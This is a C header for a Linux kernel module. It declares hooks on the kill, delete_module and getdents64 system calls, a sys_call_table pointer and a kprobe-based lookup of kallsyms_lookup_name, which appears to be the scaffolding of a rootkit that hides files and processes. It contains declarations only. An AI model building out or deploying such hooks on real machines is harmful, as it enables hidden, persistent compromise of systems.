#ifndef FILE_H_HOOKS
#define FILE_H_HOOKS

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <asm/special_insns.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include "process.h"
#include "file.h"

void my_hook_syscall(void);
void my_unregister_hook_syscall(void);
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
extern kallsyms_lookup_name_t my_kallsyms_lookup_name;
int noop_pre(struct kprobe *p ,struct pt_regs *regs);
asmlinkage long hook_tar_kill(const struct pt_regs *pt);
asmlinkage long hook_tar_delete_mod(const struct pt_regs *pt);
asmlinkage long hook_tar_getdents64(const struct pt_regs *pt);
extern unsigned long __lkm_order;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
extern t_syscall my_pre_sys_kill;
extern t_syscall my_pre_sys_delete_mod;
extern t_syscall my_pre_sys_getdents64;
extern unsigned long *__sys_call_table;
extern struct kprobe kp;
#endif
